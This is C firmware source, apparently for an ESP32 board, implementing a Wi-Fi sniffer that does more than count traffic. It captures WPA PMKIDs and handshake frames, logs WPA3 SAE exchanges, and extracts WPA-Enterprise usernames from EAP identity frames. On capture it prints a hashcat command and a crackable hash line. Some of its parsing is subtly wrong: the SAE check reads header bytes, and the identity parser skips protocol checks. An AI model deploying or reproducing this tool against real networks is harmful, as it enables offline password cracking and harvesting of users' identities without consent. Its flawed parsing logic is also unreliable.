#include "packet_analyzer.h"
#include "utils.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define TAG_PA "PKTANAL"

static uint8_t _paVerbosity = 1;

static const char* const _mgmtSubNames[16] = {
    "Assoc-Req", "Assoc-Rsp", "ReAssoc-Req", "ReAssoc-Rsp",
    "Probe-Req", "Probe-Rsp", "Rsrv-6",      "Rsrv-7",
    "Beacon",    "ATIM",      "Disassoc",    "Auth",
    "Deauth",    "Action",    "Rsrv-14",     "Rsrv-15"
};
static const char* const _ctrlSubNames[16] = {
    "Rsrv-0",  "Rsrv-1",  "Rsrv-2",  "Rsrv-3",
    "Rsrv-4",  "Rsrv-5",  "Rsrv-6",  "Rsrv-7",
    "BA-Req",  "BlockAck","PS-Poll",  "RTS",
    "CTS",     "ACK",     "CF-End",   "CF-End+CF-Ack"
};
static const char* const _dataSubNames[16] = {
    "Data",      "Data+CF-Ack", "Data+CF-Poll", "Data+CF-Ack+Poll",
    "Null",      "CF-Ack",      "CF-Poll",       "CF-Ack+Poll",
    "QoS-Data",  "QoS+CF-Ack",  "QoS+CF-Poll",  "QoS+CF-Ack+Poll",
    "QoS-Null",  "Rsrv-13",     "QoS-CF-Poll",  "Rsrv-15"
};

static inline const char* _subName(uint8_t ft, uint8_t fs) {
    if (ft == 0) return _mgmtSubNames[fs & 0x0F];
    if (ft == 1) return _ctrlSubNames[fs & 0x0F];
    if (ft == 2) return _dataSubNames[fs & 0x0F];
    return "Ext";
}
static inline const char* _typeName(uint8_t ft) {
    if (ft == 0) return "MGMT";
    if (ft == 1) return "CTRL";
    if (ft == 2) return "DATA";
    return "EXT";
}

static struct {
    uint32_t total, mgmt, ctrl, data, ext;
    uint32_t mgmtSubtype[16];
    uint32_t perChannel[14];
    int32_t  rssiSum;
    int8_t   rssiMin, rssiMax;
    uint32_t ringDropped;
    uint32_t eapolFrames;
    uint32_t pmkidFound;
    uint32_t handshakeMsg2;
    uint32_t saeFound;
    uint32_t enterpriseId;
} _paStats;

RING_BUFFER_DECLARE(pa, CFG_PA_RING_SIZE, CFG_PA_MAX_PKT_LEN)
static pa_ring_t _paRing;

static void IRAM_ATTR _paISR(void* buf, wifi_promiscuous_pkt_type_t) {
    if (!buf) return;
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    if (pkt->rx_ctrl.sig_len < 4) return;
    if (!pa_push(&_paRing, pkt->payload, pkt->rx_ctrl.sig_len,
                 pkt->rx_ctrl.rssi, (uint8_t)pkt->rx_ctrl.channel))
        _paStats.ringDropped++;
}

static void _parseEAPOL(const uint8_t* pl, uint16_t len, uint16_t eapolOff) {
    if (len < eapolOff + 4) return;
    uint8_t eType = pl[eapolOff + 1];
    if (eType != 3) return;

    uint16_t kOff = eapolOff + 4;
    if (len < kOff + 99) return;

    uint8_t  descType = pl[kOff];
    if (descType != 2 && descType != 254) return;

    uint16_t keyInfo  = ((uint16_t)pl[kOff+1] << 8) | pl[kOff+2];
    bool pairwise = (keyInfo >> 3) & 1;
    bool ack      = (keyInfo >> 7) & 1;
    bool mic      = (keyInfo >> 8) & 1;
    bool secure   = (keyInfo >> 9) & 1;

    uint16_t keyDataLen = ((uint16_t)pl[kOff+93] << 8) | pl[kOff+94];
    uint16_t kdOff = kOff + 95;

    if (pairwise && !ack && mic && !secure) {
        _paStats.handshakeMsg2++;
        const uint8_t* staMac = pl + 10;
        const uint8_t* apMac  = pl + 4;
        char sStr[18], aStr[18];
        macToStr(staMac, sStr);
        macToStr(apMac,  aStr);
        LOG_I(TAG_PA, "Msg2 (Handshake) STA:%s → AP:%s", sStr, aStr);
        return;
    }

    if (!(pairwise && ack && !mic && !secure)) return;
    if (keyDataLen == 0 || len < kdOff + keyDataLen) return;

    const uint8_t* apMac  = pl + 10;
    const uint8_t* staMac = pl + 4;
    char aStr[18], sStr[18];
    macToStr(apMac,  aStr);
    macToStr(staMac, sStr);

    uint16_t i = kdOff;
    while (i < kdOff + keyDataLen - 2) {
        uint8_t tag = pl[i];
        uint8_t tLen = pl[i+1];
        uint16_t end = i + 2 + tLen;

        if (tag == 0x30 && tLen >= 20 && end <= kdOff + keyDataLen) {
            uint16_t p = i + 2;
            if (p + 2 > end) goto next_ie;
            p += 2;
            if (p + 4 > end) goto next_ie;
            p += 4;
            if (p + 2 > end) goto next_ie;
            uint16_t pwCnt = (uint16_t)pl[p] | ((uint16_t)pl[p+1] << 8);
            p += 2 + pwCnt * 4;
            if (p + 2 > end) goto next_ie;
            uint16_t akmCnt = (uint16_t)pl[p] | ((uint16_t)pl[p+1] << 8);
            p += 2 + akmCnt * 4;
            if (p + 2 > end) goto next_ie;
            p += 2;
            if (p + 2 > end) goto next_ie;
            uint16_t pmkidCnt = (uint16_t)pl[p] | ((uint16_t)pl[p+1] << 8);
            p += 2;

            if (pmkidCnt > 0 && p + 16 <= end) {
                _paStats.pmkidFound++;
                char aHex[13], sHex[13];
                snprintf(aHex, 13, "%02X%02X%02X%02X%02X%02X",
                         apMac[0],apMac[1],apMac[2],apMac[3],apMac[4],apMac[5]);
                snprintf(sHex, 13, "%02X%02X%02X%02X%02X%02X",
                         staMac[0],staMac[1],staMac[2],staMac[3],staMac[4],staMac[5]);

                printf("\n╔══════════════════════════════════════════════════════╗\n");
                printf("║   ★★★  PMKID CAPTURED  ★★★                          ║\n");
                printf("╠══════════════════════════════════════════════════════╣\n");
                printf("║  AP  : %s                          ║\n", aStr);
                printf("║  STA : %s                          ║\n", sStr);
                printf("║  PMKID: ");
                for (int k = 0; k < 16; k++) printf("%02X", pl[p+k]);
                printf("  ║\n");
                printf("╠══════════════════════════════════════════════════════╣\n");
                printf("║  hashcat -m 22000 hash.hc22000 wordlist.txt          ║\n");
                printf("║  WPA*01*");
                for (int k = 0; k < 16; k++) printf("%02x", pl[p+k]);
                printf("*%s*%s***\n", aHex, sHex);
                printf("╚══════════════════════════════════════════════════════╝\n");
                return;
            }
        }
        next_ie:
        if (tLen == 0) break;
        i = end;
    }
}

static void _checkForEAPOL(const uint8_t* pl, uint16_t len, uint8_t fsub) {
    bool toDS   = (pl[1] >> 0) & 1;
    bool fromDS = (pl[1] >> 1) & 1;
    uint16_t hdrLen = 24;
    if (toDS && fromDS) hdrLen += 4;
    if ((fsub & 0x08) && !(fsub & 0x04)) hdrLen += 2;

    if (len < hdrLen + 12) return;

    const uint8_t* llc = pl + hdrLen;
    if (llc[0] != 0xAA || llc[1] != 0xAA ||
        llc[2] != 0x03 ||
        llc[3] != 0x00 || llc[4] != 0x00 || llc[5] != 0x00 ||
        llc[6] != 0x88 || llc[7] != 0x8E) return;

    _paStats.eapolFrames++;
    uint16_t eapolOff = hdrLen + 8;
    _parseEAPOL(pl, len, eapolOff);
}

static void _checkEnterpriseIdentity(const uint8_t* pl, uint16_t len, uint16_t hdrLen) {
    if (len < hdrLen + 9) return;
    const uint8_t* eapol = pl + hdrLen + 8;
    if (eapol[1] != 0x00) return;
    if (eapol[4] != 0x02) return;
    if (eapol[8] != 0x01) return;
    uint16_t eap_len = (eapol[6] << 8) | eapol[7];
    if (eap_len < 5) return;
    uint16_t id_len = eap_len - 5;
    if (9 + id_len > len - hdrLen) return;
    char username[65];
    uint16_t copy = id_len < 64 ? id_len : 64;
    memcpy(username, eapol + 9, copy);
    username[copy] = '\0';
    LOG_I(TAG_PA, "[Enterprise] Username: %s", username);
    _paStats.enterpriseId++;
}

static void _processPaEntry(const pa_entry_t* e) {
    const uint8_t* pl  = e->data;
    uint16_t       len = e->len;
    int8_t         rssi = e->rssi;
    uint8_t        ch   = e->channel;

    if (len < 4) return;

    uint8_t fc0   = pl[0];
    uint8_t ftype = (fc0 >> 2) & 0x03;
    uint8_t fsub  = (fc0 >> 4) & 0x0F;

    _paStats.total++;
    _paStats.rssiSum += rssi;
    if (rssi < _paStats.rssiMin) _paStats.rssiMin = rssi;
    if (rssi > _paStats.rssiMax) _paStats.rssiMax = rssi;
    if (ch >= 1 && ch <= 13) _paStats.perChannel[ch]++;

    switch (ftype) {
        case 0:
            _paStats.mgmt++;
            _paStats.mgmtSubtype[fsub & 0x0F]++;
            if ((fsub & 0x0F) == 0x0B && len >= 6) {
                uint16_t auth_alg = pl[0] | (pl[1] << 8);
                if (auth_alg == 3) {
                    _paStats.saeFound++;
                    const uint8_t* sa = pl + 10;
                    char sStr[18]; macToStr(sa, sStr);
                    uint16_t auth_seq = pl[2] | (pl[3] << 8);
                    LOG_I(TAG_PA, "[SAE] %s from %s seq=%d",
                          (auth_seq == 1) ? "Commit" : (auth_seq == 2) ? "Confirm" : "Auth",
                          sStr, auth_seq);
                }
            }
            break;
        case 1: _paStats.ctrl++; break;
        case 2:
            _paStats.data++;
            _checkForEAPOL(pl, len, fsub);
            _checkEnterpriseIdentity(pl, len, (fsub & 0x08) ? 26 : 24);
            break;
        default: _paStats.ext++; break;
    }

    if (_paVerbosity == 0) return;
    if (_paVerbosity == 1 && ftype != 0) return;
    if (_paVerbosity == 2 && ftype == 1) return;

    if (len < 24) {
        LOG_I(TAG_PA, "[%s][%s] len:%u RSSI:%d ch:%u",
              _typeName(ftype), _subName(ftype, fsub), len, rssi, ch);
        return;
    }

    const uint8_t* da    = pl + 4;
    const uint8_t* sa    = pl + 10;
    const uint8_t* bssid = pl + 16;
    char daS[18], saS[18], bsS[18];
    macToStr(da, daS); macToStr(sa, saS); macToStr(bssid, bsS);

    char ssidBuf[38] = {0};
    if (ftype == 0 && (fsub == 0x08 || fsub == 0x04 || fsub == 0x05)) {
        if (len > 26 && pl[24] == 0x00) {
            uint8_t sLen = pl[25];
            if (sLen > 0 && sLen <= 32 && (uint32_t)(26 + sLen) < len) {
                snprintf(ssidBuf, sizeof(ssidBuf), "  SSID:\"%.*s\"", (int)sLen, pl+26);
            }
        }
    }

    char reasonBuf[26] = {0};
    if (ftype == 0 && (fsub == 0x0C || fsub == 0x0A)) {
        uint16_t rc = (len >= 26) ? (uint16_t)(pl[24] | (pl[25] << 8)) : 0;
        snprintf(reasonBuf, sizeof(reasonBuf), "  Reason:%u", rc);
    }

    LOG_I(TAG_PA, "[%s][%s] %s→%s BSSID:%s RSSI:%d len:%u ch:%u%s%s",
          _typeName(ftype), _subName(ftype, fsub),
          saS, daS, bsS, rssi, len, ch, ssidBuf, reasonBuf);
}

static void _printPaStats() {
    int32_t avgRssi = (_paStats.total > 0) ? (_paStats.rssiSum / (int32_t)_paStats.total) : 0;
    int8_t rMin = (_paStats.rssiMin == INT8_MAX) ? 0 : _paStats.rssiMin;

    printf("\n╔══════════════════════════════════════════════════════╗\n");
    printf("║         Packet Analyzer — Final Report               ║\n");
    printf("╠══════════════════════════════════════════════════════╣\n");
    printf("║  Total          : %-6u                             ║\n", _paStats.total);
    printf("║  Management     : %-6u                             ║\n", _paStats.mgmt);
    printf("║  Control        : %-6u                             ║\n", _paStats.ctrl);
    printf("║  Data           : %-6u                             ║\n", _paStats.data);
    printf("║  Extension      : %-6u                             ║\n", _paStats.ext);
    printf("║  Ring dropped   : %-6u                             ║\n", _paStats.ringDropped);
    printf("╠══════════════════════════════════════════════════════╣\n");
    printf("║  RSSI min/avg/max: %4d / %4d / %4d dBm          ║\n", rMin, avgRssi, _paStats.rssiMax);
    printf("╠══════════════════════════════════════════════════════╣\n");
    printf("║  ★ EAPOL frames : %-6u                             ║\n", _paStats.eapolFrames);
    printf("║  ★ PMKID found  : %-6u                             ║\n", _paStats.pmkidFound);
    printf("║  ★ SAE (WPA3)   : %-6u                             ║\n", _paStats.saeFound);
    printf("║  ★ Enterprise ID: %-6u                             ║\n", _paStats.enterpriseId);
    printf("╠══════════════════════════════════════════════════════╣\n");
    printf("║  Management subtypes:                                ║\n");
    for (int i = 0; i < 16; i++)
        if (_paStats.mgmtSubtype[i] > 0)
            printf("║    %-14s : %-6u                          ║\n",
                   _mgmtSubNames[i], _paStats.mgmtSubtype[i]);
    printf("╠══════════════════════════════════════════════════════╣\n");
    printf("║  Packets per channel:                                ║\n");
    for (int i = 1; i <= CFG_CHANNEL_MAX; i++)
        if (_paStats.perChannel[i] > 0)
            printf("║    Ch %2d : %-6u                                  ║\n",
                   i, _paStats.perChannel[i]);
    printf("╚══════════════════════════════════════════════════════╝\n");
}

void packetAnalyzer(uint8_t channel, uint32_t durationSec, volatile bool* stopFlag) {
    memset(&_paStats, 0, sizeof(_paStats));
    _paStats.rssiMin = INT8_MAX;
    _paStats.rssiMax = INT8_MIN;
    pa_reset(&_paRing);
    _paVerbosity = 1;

    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(80));
    setTxPower(CFG_TX_POWER);

    if (!enablePromiscuous(WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA, _paISR)) {
        LOG_E(TAG_PA, "Failed to enable promiscuous mode!");
        return;
    }
    if (!setChannel(channel)) { disablePromiscuous(); return; }

    LOG_I(TAG_PA, "Analyzer on ch %u. Verbosity: '0'-'3'. 's'=stop.", channel);
    LOG_I(TAG_PA, "PMKID/SAE/Enterprise capture: ACTIVE");
    if (durationSec > 0) LOG_I(TAG_PA, "Auto-stop in %u s.", durationSec);

    uint32_t startMs   = millis();
    uint32_t lastStats = millis();

    while (!(*stopFlag)) {
        pa_entry_t entry;
        while (pa_pop(&_paRing, &entry)) _processPaEntry(&entry);

        if (durationSec > 0 && (millis()-startMs) >= durationSec*1000UL) break;

        if (millis()-lastStats >= (uint32_t)CFG_PA_STATS_EVERY_MS) {
            LOG_I(TAG_PA, "Total:%u Mgmt:%u Data:%u EAPOL:%u PMKID:%u SAE:%u EntID:%u Dropped:%u",
                  _paStats.total, _paStats.mgmt, _paStats.data,
                  _paStats.eapolFrames, _paStats.pmkidFound, _paStats.saeFound,
                  _paStats.enterpriseId, _paStats.ringDropped);
            lastStats = millis();
        }

        // Verbosity control via serial (handled by main loop)
        vTaskDelay(CFG_WDT_YIELD_TICKS);
    }

    pa_entry_t e;
    while (pa_pop(&_paRing, &e)) _processPaEntry(&e);
    disablePromiscuous();
    _printPaStats();
    LOG_I(TAG_PA, "Stopped.");
}
